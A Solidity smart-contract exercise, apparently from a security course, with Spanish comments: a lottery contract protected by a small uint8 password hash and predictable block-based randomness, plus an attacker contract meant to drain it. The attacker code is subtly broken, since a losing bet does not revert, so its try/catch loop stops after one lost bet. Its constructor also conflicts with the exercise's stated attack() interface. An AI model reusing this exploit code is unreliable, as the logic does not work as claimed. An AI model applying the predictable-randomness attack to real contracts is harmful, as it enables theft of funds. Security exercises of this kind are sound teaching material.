// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * El contrato LoteriaConPassword permite que las personas participen en una lotería
 * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
 *
 * Para poder participar, una persona provee tres elementos:
 * 1. El password
 * 2. Un número (preddicción) de un número entero (uint256)
 * 3. Una cantidad de 1500 o 1500 wei
 *
 * De acuerdo a los tests, el contrato LoteriaConPassword comienza con un balance de 1500 wei o 1500
 * El objetivo es drenar los fondos del contrato LoteriaConPassword
 *
 * Para ello se desarrollará el contrato AttackerLoteria
 * El contrato AttackerLoteria ejecutará el método attack()
 * Al hacerlo, participará en la lotería:
 * - apostando 1500 wei o 1500 (según el require de LoteriaConPassword)
 * - "adivinando" el número ganador
 * - "conociendo" el password
 *
 * La operación termina cuando el contrato AttackerLoteria gana la lotería
 *
 * Nota:
 * - No cambiar la firma del método attack()
 * - Asumir que cuando attack() es llamado, el contrato AttackerLoteria posee un balance de Ether
 *
 * ejecuar el test con:
 * npx hardhat test test/EjercicioTesting_7.js
 */

contract LoteriaConPassword {
    constructor() payable {}

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(
        uint8 password,
        uint256 _numeroGanador
    ) public payable {
        require(msg.value == 1500, "Cantidad apuesta incorrecta");
        require(
            uint256(keccak256(abi.encodePacked(password))) == FACTOR,
            "No es el hash correcto"
        );

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    tx.origin,
                    block.timestamp,
                    msg.sender
                )
            )
        );

        uint256 numeroGanador = numRandom % 10;

        if (numeroGanador == _numeroGanador) {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }
}

// contract AttackerLoteria {
//     function attack(address _sc) public payable {}
// }

contract AttackerLoteria {
    address public loteriaAddress;
    uint8 private correctPassword;

    constructor(address _loteriaAddress, uint8 _password) {
        loteriaAddress = _loteriaAddress;
        correctPassword = _password;  // This should be the precomputed correct password
    }

    function attack() public payable {
        require(msg.value >= 1500, "Insufficient funds for the attack");

        LoteriaConPassword loteria = LoteriaConPassword(loteriaAddress);

        // Since winning number is %10, we try all from 0 to 9
        for (uint256 i = 0; i < 10; i++) {
            try loteria.participarEnLoteria{value: 1500}(correctPassword, i) {
                // If the transaction does not revert, it could be a winning bet
                break;
            } catch {
                // Continue trying if not successful
            }
        }
    }

    // Function to receive Ether when winning the lottery
    receive() external payable {}

    // Helper function to fund this contract with enough Ether
    function fundAttacker() public payable {}
}
